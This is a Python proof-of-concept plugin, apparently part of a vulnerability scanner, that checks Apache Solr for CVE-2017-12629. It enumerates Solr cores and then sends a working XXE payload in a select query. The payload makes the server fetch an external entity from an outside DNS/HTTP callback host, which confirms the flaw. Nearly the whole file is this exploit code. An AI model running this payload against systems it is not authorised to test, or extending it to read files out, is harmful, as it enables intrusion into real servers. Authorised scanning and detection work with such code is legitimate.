#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
import asyncio
import re
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_TYPE, VUL_LEVEL

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SOLR
        self.name = 'CVE-2017-12629'
        self.keyword = ['solr']
        self.info = 'CVE-2017-12629'
        self.type = VUL_TYPE.XXE
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://github.com/chaitin/xray/blob/master/pocs/solr-cve-2017-12629-xxe.yml'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                dns = self.ceye_dns_api(k='cve201712629',t='url')
                for path in [self.base_url, self.base_url+"solr/"]:
                    url = path + 'admin/cores?wt=json'
                    async with session.get(url=url, allow_redirects=False) as res:
                        if res and res.status == 200:
                            text = await res.text()
                            if 'responseHeader' in text:
                                matchObj = re.search(r'"name":"(?P<core>.*?)"', text)
                                if matchObj:
                                    name = matchObj.group(1)
                                    url1 = path + name + '/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{dns}%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser'.format(dns=dns)
                                    async with session.get(url=url1) as res1:
                                        if res1:
                                            await asyncio.sleep(1)
                                            if await self.ceye_verify_api(dns, 'http'):
                                                self.flag = 1
                                                self.res.append({"info": url, "key": "CVE-2017-12629"})
                                                return